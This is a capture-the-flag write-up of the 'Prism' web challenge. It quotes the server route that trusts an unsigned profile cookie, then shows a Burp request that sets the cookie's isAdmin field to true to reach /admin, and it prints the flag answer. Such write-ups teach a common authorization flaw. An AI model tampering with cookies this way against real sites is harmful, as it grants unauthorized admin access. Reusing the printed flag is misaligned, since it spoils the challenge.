## [100 pts] Prism

###### Description

I love maimai!

Author: rorre

[http://34.101.36.1:9013/](http://34.101.36.1:9013/)

Flag = `NETSOS{4lwAys_Ch3ck_Str1cTlY_b0f656e053}`

Given source code that contain user.ts:
```ts
.get(

	"/admin",

	({ cookie: { profile } }) => {

		if (!profile.value?.isAdmin) return "Who are you?";

		return "NETSOS{REDACTED}";

	},

	{

		cookie: t.Cookie({

			profile: t.Optional(

				t.Object({

					id: t.Numeric(),

					username: t.String(),

					isAdmin: t.Boolean(),

					})

				),

			}),

		}

	)
```

it seems that we can retrieve the flag if we can acess the /admin 

however, direct acess is impossible because there is profile value check if its admin
![[Screenshot 2024-11-23 at 14.43.23.png]]

hence using burp repeater, modify the request to this:
```http
GET /admin HTTP/1.1
Host: 34.101.36.1:9013
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://34.101.36.1:9013/sign-in
Connection: keep-alive
Cookie: profile=%7B%22id%22%3A25%2C%22isAdmin%22%3Atrue%2C%22username%22%3A%22rifqy%22%7D
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

by changing the cookie from
`Cookie: profile=%7B%22id%22%3A25%2C%22isAdmin%22%3Afalse%2C%22username%22%3A%22rifqy%22%7D`

to `Cookie: profile=%7B%22id%22%3A25%2C%22isAdmin%22%3Atrue%2C%22username%22%3A%22rifqy%22%7D`

we can retrieve the flag
```
HTTP/1.1 200 OK
set-cookie: profile=%7B%22id%22%3A25%2C%22isAdmin%22%3Atrue%2C%22username%22%3A%22rifqy%22%7D; Path=/
content-type: text/plain;charset=utf-8
Date: Wed, 20 Nov 2024 04:39:02 GMT
Content-Length: 40

NETSOS{4lwAys_Ch3ck_Str1cTlY_b0f656e053}
```